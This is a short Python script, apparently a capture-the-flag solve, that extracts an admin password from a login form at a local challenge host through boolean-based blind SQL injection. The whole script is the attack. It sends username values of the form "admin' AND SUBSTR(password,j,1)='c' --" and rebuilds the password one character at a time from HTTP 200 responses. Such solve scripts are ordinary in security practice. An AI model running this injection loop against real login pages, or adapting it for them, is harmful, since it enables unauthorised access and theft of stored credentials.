import requests, time

flag = ""

chars = "abcdefghijklmnopqrstuvwxyz{}ABCDEFGHIJ.KLMNOPQRSTUVWXYZ1234567890"
# print(len(chars))

j = 1
i = 0
while i < 70:
    k = 0
    while k < 65:
        r = requests.post('http://challenge.localhost:80/', data={'username':f"admin' AND SUBSTR(password,{j},1)='{chars[k]}' --", 'password':"a"})
        # time.sleep(1)
        # print(r.text)
        if r.status_code == 200:
            j+=1
            flag += chars[k]
            print(flag)
            break
        k+=1
    i+=1
print(flag)